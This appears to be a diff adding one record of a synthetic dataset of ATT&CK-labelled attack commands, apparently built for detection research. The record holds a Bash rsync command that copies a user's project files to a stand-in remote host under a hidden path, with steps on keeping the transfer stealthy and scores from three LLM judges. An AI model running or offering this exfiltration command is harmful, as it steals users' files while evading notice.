@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --size-only --max-size=5m --exclude='.git/' $HOME/Projects/ backup@media.example.net:.cache/.pj/$HOSTNAME/",
+  "explanation": "Exfiltrates project files while limiting transfers to small files and using size-only change detection to minimize bandwidth and repeated transfers, aligning with T1020.",
+  "rationale_steps": [
+    "Target developer project data excluding VCS directories.",
+    "Use --max-size to keep transfers small and stealthy.",
+    "Rely on --size-only to skip unchanged files quickly.",
+    "Quiet, compressed session for minimal visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-c06565eb",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid rsync syntax with correct flags, balanced quoting, and proper source/destination specifiers.",
+        "semantic_score": 4,
+        "semantic_justification": "The command plausibly exfiltrates project files to a remote host with compression, size-only change detection, and size filtering consistent with automated exfiltration behavior, but it lacks an explicit scheduling or scripting context to demonstrate full automation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:11:27.999325Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The rsync command is perfectly well-formed with valid flags (-azq), properly formatted options (--size-only, --max-size=5m, --exclude='.git/'), and correct source/destination paths.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1020 (Automated Exfiltration) as it uses rsync to automatically transfer project files to a remote server while employing size filtering, exclusions, and quiet operation to minimize detection, and the destination path (.cache/.pj/) appears deliberately obscured.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:11:31.533256Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quoting, correct environment variable usage, and proper syntax for source and destination paths.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively demonstrates automated exfiltration by using `rsync` for remote data transfer, employing compression (`-z`), stealthy quiet mode (`-q`), bandwidth-minimizing flags (`--size-only`, `--max-size`), and excluding irrelevant data (`--exclude='.git/'`), all aligning perfectly with the T1020 technique description and the provided explanation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:40:03.877262Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
